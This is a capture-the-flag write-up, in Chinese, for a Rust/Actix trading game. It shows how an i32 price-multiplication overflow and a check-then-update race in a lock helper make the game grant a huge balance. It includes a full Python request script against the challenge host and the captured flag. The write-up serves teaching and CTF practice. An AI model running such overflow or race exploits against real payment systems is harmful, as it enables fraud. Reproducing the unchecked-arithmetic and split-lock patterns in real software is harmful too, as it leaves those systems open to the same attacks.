# Crab Commodities

## 题目简述

题目是用 Rust/Actix 编写的商品交易游戏。玩家初始只有 30,000 美元，7 天内需要攒到 2,000,000,000 美元购买 Flag 升级。正常交易无法达到目标。

源码中同时存在两类问题：release 构建关闭整数溢出检查，`i32` 价格乘法会回绕；自定义 `LockHelper` 又把读取和写入分别加锁，无法保证“检查后更新”整体原子性。最短解法可直接利用购买 Storage Upgrade 时的有符号乘法溢出，竞态则是官方预期路线。

## 解题过程

注册账户后，购买升级的接口接收攻击者可控的 `i32 quantity`：

```rust
if body.quantity <= 0 || body.quantity > 32767 {
    return invalid_quantity;
}

let mut price = item.price;
if item.name == "Donate to charity"
    || item.name == "Storage Upgrade"
{
    price *= body.quantity;
}

if user.game.money.get() < price as i64 {
    return not_enough_money;
}
```

`Storage Upgrade` 单价为 100,000。Dockerfile 使用 `cargo build --release`，默认不检查整数溢出，因此乘法在 32 位有符号整数上回绕。

选择 `quantity = 21475`：

$$
100000\times21475=2147500000
$$

这个结果比 `i32::MAX = 2147483647` 大 16,353。按二进制补码回绕后，接口看到的价格是：

$$
2147500000-2^{32}=-2147467296
$$

初始余额 30,000 显然不小于一个负价格，因此余额检查通过。扣款语句又把 `price` 转成 `i64`：

```rust
user.game.money.set(
    user.game.money.get() - price as i64
);
```

于是“减去负价格”后余额变为 2,147,497,296，已经足够购买 2,000,000,000 美元的 Flag。数量 21,475 没有超过接口限制，升级列表也仍有空间容纳 Flag 条目。

完整请求流程如下：

```python
import secrets

import requests

base = "http://crab-commodities.ctf.sekai.team"
session = requests.Session()

username = "player-" + secrets.token_hex(4)
password = secrets.token_hex(8)

response = session.post(
    f"{base}/auth/register",
    data={"username": username, "password": password},
    timeout=10,
)
response.raise_for_status()

response = session.post(
    f"{base}/api/upgrade",
    data={
        "name": "Storage Upgrade",
        "quantity": "21475",
    },
    timeout=10,
)
print(response.text)

response = session.post(
    f"{base}/api/upgrade",
    data={
        "name": "Flag",
        "quantity": "1",
    },
    timeout=10,
)
print(response.text)

page = session.get(f"{base}/game", timeout=10)
print(page.text)
```

`/game` 检测到升级列表中存在 `Flag` 后，把环境变量中的 flag 插入页面：

```text
SEKAI{rust_is_pretty_s4fe_but_n0t_safe_enough!!}
```

官方预期路线使用竞态获得启动资金。`LockHelper<T>` 的 `get()` 和 `set()` 各自持有一次互斥锁：

```rust
pub fn get(&self) -> T {
    let mutex = self.value.lock().unwrap();
    mutex.clone()
}

pub fn set(&self, val: T) {
    let mut mutex = self.value.lock().unwrap();
    *mutex = val;
}
```

但调用代码采用 `set(get() - price)`。锁在 `get()` 返回后已经释放，多个请求可以同时通过 “尚未领取 Loan” 的检查，再分别写回升级列表和余额。官方脚本先花 5,000 美元购买 5,000 个 Donation 条目，让 `has_upgrade()` 每次线性遍历更慢、扩大竞态窗口，然后并发发送 10 个 Loan 请求。获得至少 3 笔 37,500 美元贷款后，可购买 Storage Upgrade，再利用商品数量的 `i32` 乘法与库存加法溢出扩大余额。

这条竞态链解释了 `race.py` 和 `overflow.rs` 两个官方脚本的作用，但直接选择能让 Storage Upgrade 总价回绕到接近 `i32::MIN` 的数量，步骤更短且同样由发布源码验证。

## 方法总结

“Rust 防止数据竞争”不等于业务逻辑不会发生竞态。互斥锁只包住单次读写，而没有包住“检查、计算、写回”整个临界区，仍会产生 TOCTOU 问题。

另一处问题是把用户数量与单价保存在 `i32` 中，并依赖 release 模式的回绕行为。选择溢出数量时不能只追求最大值：应计算回绕后的符号和幅度，同时确保升级列表仍能加入 Flag。这里的 21,475 恰好把价格变成约 $-2.147$ 十亿，一次操作即可跨过目标余额。
